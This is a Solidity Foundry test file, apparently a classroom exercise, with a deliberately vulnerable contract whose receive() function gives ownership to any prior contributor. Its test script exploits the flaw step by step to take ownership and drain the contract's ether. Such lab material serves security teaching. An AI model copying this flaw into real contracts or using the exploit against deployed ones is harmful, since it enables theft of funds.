// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IAssignment11 {
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function withdraw() external;
    function owner() external view returns (address);
}

contract FallbackTest is Test {
    IAssignment11 target;
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 1 ether);

        // Deploy vulnerable contract from a different address (owner)
        vm.startPrank(address(0xDEAD));
        Assignment11 deployed = new Assignment11();
        vm.stopPrank();

        target = IAssignment11(address(deployed));

        // Fund the contract with ETH
        vm.deal(address(target), 5 ether);
    }

    function testStudentSolution() public {
        vm.startPrank(attacker);

        // 1. contribute() with < 0.001 ether
        target.contribute{value: 0.0009 ether}();
        assertGt(target.getContribution(), 0);

        // 2. Send ETH directly to trigger receive()
        (bool ok, ) = address(target).call{value: 0.001 ether}("");
        require(ok, "direct send failed");

        // 3. Check if we are now the owner
        assertEq(target.owner(), attacker, "Ownership not transferred");

        // 4. Withdraw all funds
        target.withdraw();

        vm.stopPrank();
    }

    receive() external payable {}
}

contract Assignment11 {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
